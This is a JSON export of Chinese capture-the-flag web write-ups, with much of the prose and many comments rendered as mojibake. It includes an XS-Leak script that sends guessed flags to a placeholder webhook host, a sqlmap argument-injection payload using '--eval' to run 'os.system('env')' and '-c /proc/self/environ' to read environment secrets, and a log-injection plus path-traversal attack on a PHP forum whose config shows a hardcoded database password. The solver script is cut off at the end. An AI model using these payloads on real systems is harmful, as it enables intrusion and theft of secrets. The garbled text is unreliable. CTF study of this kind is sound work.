[{"content":"web internal_api æ‰“XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script\u0026gt; function checkError(url) { // å®šä¹‰å‡½æ•°ï¼Œå‚æ•°åº”ä¸ºå°è¯•çš„æ–°flagï¼ˆä½†è¢«é”™è¯¯è¦†ç›–ï¼‰ url = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34; + flag; // ğŸš¨é”™è¯¯ï¼šè¦†ç›–ä¼ å…¥çš„urlå‚æ•°ï¼Œå®é™…ä½¿ç”¨çš„flagå§‹ç»ˆæ˜¯å…¨å±€å˜é‡åˆå§‹å€¼ let script = document.createElement(\u0026#39;script\u0026#39;) // åˆ›å»º\u0026lt;script\u0026gt;æ ‡ç­¾ç”¨äºå‘èµ·è¯·æ±‚ let ret = false // ğŸš¨æœªä½¿ç”¨çš„å˜é‡ script.src = url // è®¾ç½®è„šæœ¬åœ°å€ï¼ˆå®é™…ä¸ºå›ºå®šåœ°å€ï¼Œæ— æ³•æµ‹è¯•æ–°å­—ç¬¦ï¼‰ script.onload = () =\u0026gt; { // è„šæœ¬åŠ è½½æˆåŠŸæ—¶è§¦å‘ fetch(\u0026#34;http://yourwebhook/?flag=\u0026#34; + flag) // å‘é€å½“å‰å…¨å±€flagåˆ°æ”»å‡»è€…æœåŠ¡å™¨ï¼ˆä½†å…¨å±€flagä»æœªæ›´æ–°ï¼‰ } script.onerror = (e) =\u0026gt; {} // åŠ è½½å¤±è´¥ä¸å¤„ç†ï¼ˆæœªåˆ©ç”¨é”™è¯¯ä¿¡æ¯ï¼‰ document.head.appendChild(script) // æ’å…¥è„šæœ¬ä»¥è§¦å‘è¯·æ±‚ } // å®šä¹‰å­—ç¬¦é›†å’Œå·²çŸ¥flagå‰ç¼€ let charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-}\u0026#39; // çŒœæµ‹å­—ç¬¦èŒƒå›´ï¼ˆåŒ…å«é—­åˆç¬¦}ï¼‰ let flag = \u0026#39;flag{\u0026#39; // Flagçš„é€šç”¨å¼€å¤´ï¼ˆCTFå¸¸è§æ ¼å¼ï¼‰ // ä¸»çˆ†ç ´å¾ªç¯ for (let i = 0; i \u0026lt; charset.length; i++) { // éå†å­—ç¬¦é›† let c = charset[i] // è·å–å½“å‰å°è¯•çš„å­—ç¬¦ let newFlag = flag + c // ç»„åˆæ–°flagï¼ˆå¦‚flag{aï¼‰ checkError(newFlag) // ğŸš¨é”™è¯¯ï¼šä¼ å…¥å‚æ•°æœªè¢«å‡½æ•°ä½¿ç”¨ï¼Œå®é™…æ‰€æœ‰è¯·æ±‚ä»ä¸ºflag{ } \u0026lt;/script\u0026gt; æ¯æ¬¡è¿è¡Œçˆ†å‡ºä¸€ä½ï¼Œç„¶åæ‰‹åŠ¨åœ¨let flag = \u0026lsquo;flag{\u0026lsquo;ååŠ ä¸Šå³å¯\næ–‡ç«  - æµ…è°ˆXS-Leaksä¹‹Timeless timing attck - å…ˆçŸ¥ç¤¾åŒº\nsqlmap-master å…ˆå®¡è®¡ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from fastapi import FastAPI, Request # å¯¼å…¥FastAPIæ¡†æ¶åŠè¯·æ±‚å¯¹è±¡ from fastapi.responses import FileResponse, StreamingResponse # å¯¼å…¥æ–‡ä»¶å“åº”å’Œæµå¼å“åº”ç±» import subprocess # ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ app = FastAPI() # åˆ›å»ºFastAPIåº”ç”¨å®ä¾‹ @app.get(\u0026#34;/\u0026#34;) # å®šä¹‰æ ¹è·¯å¾„çš„GETè·¯ç”± async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) # è¿”å›é™æ€æ–‡ä»¶index.htmlï¼ˆå‰ç«¯é¡µé¢ï¼‰ @app.post(\u0026#34;/run\u0026#34;) # å®šä¹‰/runè·¯å¾„çš„POSTè·¯ç”± async def run(request: Request): # æ¥æ”¶è¯·æ±‚å¯¹è±¡ data = await request.json() # å¼‚æ­¥è·å–è¯·æ±‚çš„JSONæ•°æ® url = data.get(\u0026#34;url\u0026#34;) # ä»æ•°æ®ä¸­æå–urlå‚æ•° if not url: # æ ¡éªŒurlå‚æ•°æ˜¯å¦å­˜åœ¨ return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} # è¿”å›é”™è¯¯ä¿¡æ¯ # æ„å»ºsqlmapå‘½ä»¤ï¼ˆå­˜åœ¨å®‰å…¨é£é™©ï¼è§ä¸‹æ–¹è­¦å‘Šï¼‰ command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; # ç›´æ¥æ‹¼æ¥å‚æ•°å¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥æ¼æ´ def generate(): # å®šä¹‰ç”Ÿæˆå™¨å‡½æ•°ç”¨äºæµå¼è¾“å‡º # å¯åŠ¨å­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ process = subprocess.Popen( command.split(), # å°†å‘½ä»¤æŒ‰ç©ºæ ¼åˆ†å‰²æˆåˆ—è¡¨ï¼ˆç®€å•æ–¹å¼ï¼Œå¤æ‚å‚æ•°å¯èƒ½å‡ºé”™ï¼‰ stdout=subprocess.PIPE, # æ•è·æ ‡å‡†è¾“å‡º stderr=subprocess.STDOUT, # å°†é”™è¯¯è¾“å‡ºåˆå¹¶åˆ°æ ‡å‡†è¾“å‡º shell=False # ç¦ç”¨shellæ¨¡å¼ï¼ˆå®‰å…¨æœ€ä½³å®è·µï¼‰ ) while True: # æŒç»­è¯»å–è¾“å‡º output = process.stdout.readline() # é€è¡Œè¯»å–è¾“å‡º if output == \u0026#39;\u0026#39; and process.poll() is not None: # åˆ¤æ–­è¿›ç¨‹æ˜¯å¦ç»“æŸ break if output: # å¦‚æœæœ‰è¾“å‡ºå†…å®¹ yield output # ç”Ÿæˆè¾“å‡ºå†…å®¹ # è¿”å›æµå¼å“åº”ï¼ˆå®æ—¶æ˜¾ç¤ºæ‰«æç»“æœï¼‰ return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) è¿™é‡Œshell=flase,æ„å‘³å†…å®¹ä¸ä¼šç»è¿‡ Shell çš„è¯­æ³•è§£æï¼Œå…¨è¢«å½“ä½œå‚æ•°çœ‹å¾…ï¼Œé‚£å°±ç›´æ¥æ‰¾æ‰¾sqlmapæœ‰å“ªäº›å¯ä»¥æ‰§è¡Œå‘½ä»¤æˆ–è€…è¯»æ–‡ä»¶çš„å‚æ•°\nsqlmap | GTFOBins\né€šè¿‡ \u0026ndash;eval å‚æ•°å¯ä»¥æ‰§â¾ Python ä»£ç , æ³¨æ„å› ä¸ºä¸Šâ¾¯ command.split() é»˜è®¤æ˜¯æŒ‰ç©ºæ ¼åˆ†éš”çš„ï¼ˆæ‰€ä»¥ä¸‹é¢çš„=å·å¯å˜ç©ºæ ¼ï¼‰ï¼Œæ³¨æ„è¿™â¾¥å‚æ•°çš„å€¼ä¸éœ€è¦åŠ ä¸Šå•åŒå¼•å·, å› ä¸ºä¸Šâ¾¯å·²ç»è®¾ç½®äº† shell=False , å¦‚æœåŠ ä¸Šå»åâ½½ä»£è¡¨çš„æ˜¯ \u0026ldquo;eval â¼€ä¸ª Python å­—ç¬¦ä¸²\u0026rdquo;ï¼Œç„¶åå°†payloadæ”¹ä¸ºç´§å‡‘å‹ï¼Œé¿å…ä½¿ç”¨åˆ†å·ã€‚\næœ€ç»ˆpayload\næœ€åæ‰“127.0.0.1 --eval=__import__('os').system('env')//ç­‰å·å¯ä»¥å˜ç©ºæ ¼\nç”¨æ³• | sqlmap ç”¨æˆ·æ‰‹å†Œ\nç¿»äº†ç¿»sqlmapæ‰‹å†Œï¼Œå‘ç°-cå¯ä»¥åŠ è½½é…ç½®æ–‡ä»¶é€‰é¡¹ã€\næ‰€ä»¥ä¹Ÿå¯ä»¥æ‰“\nhttps://localhost?id=1 -c /proc/self/environ //id=1æ²¡å®é™…ä½œç”¨ï¼Œæµ‹è¯•æ—¶å€™å†™çš„ï¼Œå¯ä»¥ä¸åŠ \nez_dash misc ","date":"0001-01-01T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/","title":""},{"content":"ccforum Seayå®¡è®¡ä¸€ä¸‹ä»£ç \nadmin.phpä¸config.phpå­˜åœ¨file_get_contentå‡½æ•°ï¼Œå³å­˜åœ¨æ–‡ä»¶è¯»å–æ¼æ´ï¼Œé‚£ä¹ˆå…ˆå®¡è®¡admin.php\nadmin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php // å¼•å…¥é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸åŒ…å«æ•°æ®åº“è¿æ¥ä¿¡æ¯ç­‰ require \u0026#39;config.php\u0026#39;; // æ£€æŸ¥è¯·æ±‚æ–¹æ³•æ˜¯å¦ä¸ºPOSTï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å¤„ç†ç™»å½•é€»è¾‘ if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39;) { // è·å–POSTè¯·æ±‚ä¸­çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸² $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; try { // å‡†å¤‡SQLè¯­å¥ï¼ŒæŸ¥è¯¢adminsè¡¨ä¸­ç”¨æˆ·ååŒ¹é…çš„è®°å½• $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT * FROM admins WHERE username = ?\u0026#34;); // æ‰§è¡ŒæŸ¥è¯¢ï¼Œä¼ å…¥ç”¨æˆ·åä½œä¸ºå‚æ•° $stmt-\u0026gt;execute([$username]); // è·å–æŸ¥è¯¢ç»“æœ $admin = $stmt-\u0026gt;fetch(); // å¦‚æœæŸ¥è¯¢åˆ°ç®¡ç†å‘˜ä¸”å¯†ç éªŒè¯é€šè¿‡ if ($admin \u0026amp;\u0026amp; password_verify($password, $admin[\u0026#39;password\u0026#39;])) { // è®¾ç½®ä¼šè¯å˜é‡ï¼Œæ ‡è¯†ç®¡ç†å‘˜ç™»å½•çŠ¶æ€ $_SESSION[\u0026#39;admin_id\u0026#39;] = $admin[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;admin_username\u0026#39;] = $admin[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;admin\u0026#39;] = true; // è®°å½•ç™»å½•æˆåŠŸçš„æ“ä½œæ—¥å¿— log_action($username, \u0026#39;admin_login\u0026#39;, 1); // é‡å®šå‘åˆ°ç®¡ç†å‘˜é¡µé¢ header(\u0026#34;Location: admin.php\u0026#34;); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ exit(); } else { // è®°å½•ç™»å½•å¤±è´¥çš„æ“ä½œæ—¥å¿— log_action($username, \u0026#39;admin_login\u0026#39;, 0, \u0026#39;Invalid credentials\u0026#39;); // è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ die(\u0026#34;Invalid credentials\u0026#34;); } } catch (PDOException $e) { // æ•è·æ•°æ®åº“æ“ä½œå¼‚å¸¸ï¼Œè®°å½•é”™è¯¯æ—¥å¿— log_action($username, \u0026#39;admin_login\u0026#39;, 0, $e-\u0026gt;getMessage()); // è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ die(\u0026#34;Admin login failed: \u0026#34; . $e-\u0026gt;getMessage()); } } // æ£€æŸ¥ä¼šè¯ä¸­æ˜¯å¦æ²¡æœ‰ç®¡ç†å‘˜ç™»å½•çŠ¶æ€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ‹’ç»è®¿é—® if (!isset($_SESSION[\u0026#39;admin\u0026#39;]) || !$_SESSION[\u0026#39;admin\u0026#39;]) { die(\u0026#34;Access denied. Please login as admin.\u0026#34;); } // å®šä¹‰æ“ä½œæ—¥å¿—æ–‡ä»¶è·¯å¾„ $action_log_path = \u0026#39;/var/www/action.log\u0026#39;; // æ£€æŸ¥æ“ä½œæ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ if (!file_exists($action_log_path)) { die(\u0026#34;Action log file not found.\u0026#34;); } // è¯»å–æ“ä½œæ—¥å¿—æ–‡ä»¶å†…å®¹ $action_log = file_get_contents($action_log_path); // å°†æ—¥å¿—å†…å®¹æŒ‰è¡Œåˆ†å‰²æˆæ•°ç»„ $log_lines = explode(\u0026#34;\\n\u0026#34;, $action_log); // åˆå§‹åŒ–è¢«å°ç¦ç”¨æˆ·å’Œå¤±è´¥æ—¥å¿—æ•°ç»„ $banned_users = []; $failed_logs = []; // éå†æ¯ä¸€è¡Œæ—¥å¿— foreach ($log_lines as $line) { // å¦‚æœè¡Œä¸ºç©ºï¼Œè·³è¿‡ if (empty($line)) { continue; } // æŒ‰é€—å·åˆ†å‰²æ—¥å¿—è¡Œ $parts = explode(\u0026#39;,\u0026#39;, $line); // å¦‚æœåˆ†å‰²åçš„éƒ¨åˆ†æ•°é‡ä¸è¶³5ä¸ªï¼Œè·³è¿‡ if (count($parts) \u0026lt; 5) { continue; } // è·å–ç¼–ç åçš„ç”¨æˆ·åã€æ“ä½œç±»å‹ã€æˆåŠŸçŠ¶æ€å’Œé™„åŠ ä¿¡æ¯ $encoded_user = $parts[1]; $action = $parts[2]; $success = (int) $parts[3]; $additional_info = $parts[4]; //æ€»ç»“ä¸Šé¢çš„ä»£ç å°±æ˜¯è·å–/var/www/action.logç»™action_logï¼Œå†ç”¨ï¼Œåˆ†å‰²æˆpart // å¦‚æœæ“ä½œç±»å‹æ˜¯è®°å½•å°ç¦ if ($action === \u0026#39;record_banned\u0026#39;) { // å¦‚æœæ“ä½œæˆåŠŸ if ($success === 1) { // å°†é™„åŠ ä¿¡æ¯æ·»åŠ åˆ°è¢«å°ç¦ç”¨æˆ·æ•°ç»„ä¸­ $banned_users[$encoded_user][] = $additional_info; } else { // å°†é™„åŠ ä¿¡æ¯æ·»åŠ åˆ°å¤±è´¥æ—¥å¿—æ•°ç»„ä¸­ $failed_logs[] = $additional_info; } } } //è¿™é‡Œè¦æ±‚action==record_banned,success=1,ç„¶åè¿›è¡Œä¸‹é¢çš„éå†æ–‡ä»¶ç›®å½•çš„å†…å®¹å…¨éƒ¨ä¼ ç»™å‚æ•°ï¼Œ æ‰€ä»¥å¦‚æœæ„é€ {$encoded_user}ä¸º../../../,å°±ç›¸å½“ä¸å›åˆ°æ ¹ç›®å½•ï¼Œä»è€Œå¯èƒ½è¯»åˆ°flag // åˆå§‹åŒ–è¢«å°ç¦å†…å®¹æ•°ç»„ $banned_contents = []; // éå†è¢«å°ç¦ç”¨æˆ·æ•°ç»„ foreach ($banned_users as $encoded_user =\u0026gt; $logs) { // æ„é€ è¢«å°ç¦ç”¨æˆ·ç›®å½•è·¯å¾„ $banned_dir = \u0026#34;/var/www/banned/{$encoded_user}\u0026#34;;//æ„é€ {$encoded_user}ä¸º../../../ï¼Œä¹‹åç›´æ¥è¯»æ ¹ç›®å½• // å¦‚æœç›®å½•å­˜åœ¨ if (file_exists($banned_dir)) { // è·å–ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨ $files = scandir($banned_dir); // éå†æ–‡ä»¶åˆ—è¡¨ foreach ($files as $file) { // è·³è¿‡ç›®å½•æœ¬èº«å’Œçˆ¶ç›®å½• if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { // æ„é€ æ–‡ä»¶è·¯å¾„ $file_path = $banned_dir . \u0026#39;/\u0026#39; . $file; // è¯»å–æ–‡ä»¶å†…å®¹ $content = file_get_contents($file_path); // å°†å†…å®¹æ·»åŠ åˆ°è¢«å°ç¦å†…å®¹æ•°ç»„ä¸­ $banned_contents[$username][] = $content; } } } } ?\u0026gt; æ¥ä¸‹æ¥è¦çŸ¥é“action.logçš„å†…å®¹ï¼Œæ‰€ä»¥å…ˆçœ‹çœ‹config.phpæ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 // å¯åŠ¨ä¼šè¯ session_start(); // å®šä¹‰æ•°æ®åº“è¿æ¥å‚æ•° define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;); define(\u0026#39;DB_PORT\u0026#39;, \u0026#39;3306\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;forum\u0026#39;); define(\u0026#39;DB_USER\u0026#39;, \u0026#39;mgr\u0026#39;); define(\u0026#39;DB_PASS\u0026#39;, \u0026#39;j92wn0UXFYsUAFiN\u0026#39;); try { // åˆ›å»ºPDOå®ä¾‹ï¼Œè¿æ¥åˆ°MySQLæ•°æ®åº“ $pdo = new PDO( \u0026#34;mysql:host=\u0026#34; . DB_HOST . \u0026#34;;port=\u0026#34; . DB_PORT . \u0026#34;;dbname=\u0026#34; . DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE =\u0026gt; PDO::ERRMODE_EXCEPTION] // è®¾ç½®é”™è¯¯æ¨¡å¼ä¸ºå¼‚å¸¸ ); } catch (PDOException $e) { // å¦‚æœè¿æ¥å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬ die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå¯¹ç”¨æˆ·åè¿›è¡ŒBase64ç¼–ç  function encode_uname($username) { return base64_encode($username); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè®°å½•æ“ä½œæ—¥å¿— function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // ç”Ÿæˆå”¯ä¸€çš„æ—¥å¿—ID $log_id = uniqid(); // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ ¼å¼åŒ–æ—¥å¿—è¡Œ $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // å°†æ—¥å¿—è¡Œè¿½åŠ åˆ°æ“ä½œæ—¥å¿—æ–‡ä»¶ä¸­ file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè®°å½•å°ç¦æ“ä½œ function record_banned($username, $banned) { // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ„é€ è¢«å°ç¦ç”¨æˆ·ç›®å½•è·¯å¾„ $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // å‡è®¾ç›®å½•åˆ›å»ºæˆåŠŸ $created = true; // å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™å°è¯•åˆ›å»º if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // è®¾ç½®ç›®å½•æƒé™ä¸º0750 } // åˆå§‹åŒ–æ—¥å¿—ä¿¡æ¯å’ŒæˆåŠŸçŠ¶æ€ $log = \u0026#34;\u0026#34;; $succ = 1; // å¦‚æœç›®å½•åˆ›å»ºå¤±è´¥ if (!$created) { $succ = 0; // è®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // è®°å½•é”™è¯¯ä¿¡æ¯ } else { // æ„é€ æ–‡ä»¶åï¼Œä½¿ç”¨å½“å‰æ—¶é—´æˆ³ $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // å°è¯•å°†å°ç¦å†…å®¹å†™å…¥æ–‡ä»¶ if (!file_put_contents($filename, $banned)) { $succ = 0; // å¦‚æœå†™å…¥å¤±è´¥ï¼Œè®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to record banned content\u0026#34;; // è®°å½•é”™è¯¯ä¿¡æ¯ } } // è°ƒç”¨log_actionå‡½æ•°è®°å½•å°ç¦æ“ä½œçš„æ—¥å¿— log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } // å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«æ•æ„Ÿè¯ function has_sensitive_words($content) { // å®šä¹‰æ•æ„Ÿè¯åˆ—è¡¨ $SENSITIVE_WORDS = [\u0026#39;æ•æ„Ÿè¯\u0026#39;, \u0026#39;SENSITIVE WORDS\u0026#39;,]; // éå†æ•æ„Ÿè¯åˆ—è¡¨ foreach ($SENSITIVE_WORDS as $word) { // ä½¿ç”¨striposå‡½æ•°ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æ£€æŸ¥å†…å®¹ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿè¯ if (stripos($content, $word) !== false) { // å¦‚æœæ‰¾åˆ°æ•æ„Ÿè¯ï¼Œè¿”å›true return true; } } // å¦‚æœæ²¡æœ‰æ‰¾åˆ°æ•æ„Ÿè¯ï¼Œè¿”å›false return false; } é¦–å…ˆçœ‹log_actionå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // ç”Ÿæˆå”¯ä¸€çš„æ—¥å¿—ID $log_id = uniqid(); // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ ¼å¼åŒ–æ—¥å¿—è¡Œ $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // å°†æ—¥å¿—è¡Œè¿½åŠ åˆ°æ“ä½œæ—¥å¿—æ–‡ä»¶ä¸­ file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } çœ‹è¿™ä¸ªä»£ç çŸ¥é“ï¼Œlog_idæ˜¯å”¯ä¸€ç”Ÿæˆçš„ï¼Œä¸å¯æ§åˆ¶ï¼Œe_usernameè¢«åŠ å¯†ï¼Œä¸å¥½æ§åˆ¶è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œactionè¦=record_banned,success=1ï¼Œæ‰€ä»¥åªèƒ½æ§åˆ¶additional(å®ƒåˆšå¥½ä¸ºç©º)\næ¥ä¸‹æ¥å¯»æ‰¾è°ƒç”¨action_logçš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯record_bannedå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function record_banned($username, $banned) { // å¯¹ç”¨æˆ·åè¿›è¡Œç¼–ç  $e_username = encode_uname($username); // æ„é€ è¢«å°ç¦ç”¨æˆ·ç›®å½•è·¯å¾„ $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // å‡è®¾ç›®å½•åˆ›å»ºæˆåŠŸ $created = true; // å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™å°è¯•åˆ›å»º if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // è®¾ç½®ç›®å½•æƒé™ä¸º0750 } // åˆå§‹åŒ–æ—¥å¿—ä¿¡æ¯å’ŒæˆåŠŸçŠ¶æ€ $log = \u0026#34;\u0026#34;; $succ = 1; // å¦‚æœç›®å½•åˆ›å»ºå¤±è´¥ if (!$created) { $succ = 0; // è®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // è®°å½•é”™è¯¯ä¿¡æ¯ } else { // æ„é€ æ–‡ä»¶åï¼Œä½¿ç”¨å½“å‰æ—¶é—´æˆ³ $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // å°è¯•å°†å°ç¦å†…å®¹å†™å…¥æ–‡ä»¶ if (!file_put_contents($filename, $banned)) { $succ = 0; // å¦‚æœå†™å…¥å¤±è´¥ï¼Œè®¾ç½®æˆåŠŸçŠ¶æ€ä¸ºå¤±è´¥ $log = \u0026#34;Failed to record banned content\u0026#34;; // è®°å½•é”™è¯¯ä¿¡æ¯ } } // è°ƒç”¨log_actionå‡½æ•°è®°å½•å°ç¦æ“ä½œçš„æ—¥å¿— log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } è¿™é‡Œè‹¥æ˜¯æƒ³ä¼ å…¥/var/www/action.logåæƒ³è¦å˜é‡æ ¹ç›®å½•æ‰€æœ‰æ–‡ä»¶ï¼Œå¿…é¡»æœ‰æŸä¸€è¡Œæ»¡è¶³?(path[0]æ˜¯idä¸ç”¨ç®¡)ï¼Œ../../../,record_banned,1,(path[4]æ— è¦æ±‚)ï¼Œç¬¬ä¸€è¡Œæ˜¯ç»å¯¹ä¸å¯èƒ½ï¼Œå› ä¸ºusernameè¢«base64åŠ å¯†ï¼Œæ‰€ä»¥ç¬¬ä¸€è¡Œå°±æ„é€ ä¸äº†../../../ï¼ˆå› ä¸ºæ²¡æœ‰ä»€ä¹ˆåŠ å¯†åæ˜¯../../../ï¼‰,æ‰€ä»¥å°±åœ¨ç¬¬äºŒè¡Œæ„é€ ?,../../../,record_banned,1,?ã€‚é‚£ä¹ˆå°±è¦åœ¨logä¸‹æ‰‹äº†\nè¿™é‡Œ$logæœ‰3ç§æƒ…å†µï¼Œç©ºæˆ–Failed to create record directory for \u0026quot; . $username;æˆ–\u0026quot;Failed to record banned content\u0026quot;ï¼›æ˜¾ç„¶æˆ‘ä»¬è¦é€šè¿‡æ„é€ usernameè¿™ä¸ªå˜é‡è¾¾åˆ°ç›®çš„ã€‚æ‰€ä»¥log=\u0026ldquo;Failed to create record directory for \u0026quot; . $username;è¦åˆ°è¾¾è¿™ä¸ªç›®çš„ï¼Œå°±è¦ä½¿åˆ›å»ºç›®å½•å¤±è´¥ï¼Œmkdiræ–¹æ³•ä¸å¯ä»¥åˆ›å»ºå¤šçº§ç›®å½•ï¼Œå³å…¶ä¸­ä¸èƒ½åŒ…å«/å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´usernameç¼–ç ååŒ…å«/,æ°å¥½???ç¼–ç åæœ‰/\nç¬¬äºŒè¡Œæ€ä¹ˆå‡ºæ¥ï¼Ÿæ˜¾ç„¶è¦%0a,é‚£è¿˜è¦æ»¡è¶³ç¬¬äºŒè¡ŒåŒ…æ‹¬?,../../../,record_banned,? é‚£å¾ˆæ˜¾ç„¶äº†ï¼Œusername=???%0a,../../../,record_banned,1,\næ‰€ä»¥å†™å…¥/var/www/action.logçš„å†…å®¹æ˜¯\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???%0a,../../../,record_banned,1, ç»è¿‡åˆ†è¡Œåç¬¬ä¸€è¡Œæ˜¯\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???\nç¬¬äºŒè¡Œæ˜¯,../../../,record_banned,1, ç¬¦åˆè¦æ±‚ï¼\næ¥ä¸‹æ¥æ‰¾è°ƒç”¨record_bannedçš„å‡½æ•°ï¼Œåœ¨post.phpé‡Œ\nhas_sensitive_wordsåœ¨config.phpé‡Œ\næ˜¾ç„¶è¦ç¬¦åˆhas_sensitive_words($title) || has_sensitive_words($content)ï¼Œå³è®©titleæˆ–contentå­˜åœ¨æ•æ„Ÿè¯æˆ–è€… SENSITIVE WORDS\næ‰€ä»¥è§£é¢˜æ€è·¯ã€\n1.å…ˆæ³¨å†Œç”¨æˆ·username=???\\n,../../../,record_banned,1, password=111111111(ä»»æ„å†…å®¹ï¼Œæ»¡è¶³é•¿åº¦å°±å¥½,æ‰‹åŠ¨æ³¨å†Œçš„è¯\\nè¦å†™æˆ%0a)\n2.è®¿é—®postè·¯ç”±ï¼Œpostä¼ å‚titleæˆ–è€…content\n3.ç™»å…¥ç®¡ç†å‘˜è´¦æˆ·ï¼Œè¿›å…¥admin.php,æ‹¿åˆ°flagï¼ˆçˆ†ç ´ï¼‰\nç›´æ¥æ‰“è„šæœ¬ä¹Ÿè¡Œï¼Œç„¶åç›´æ¥è®¿é—®admin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from requests import Session basic = \u0026#34;http://ip:9090/\u0026#34; data = 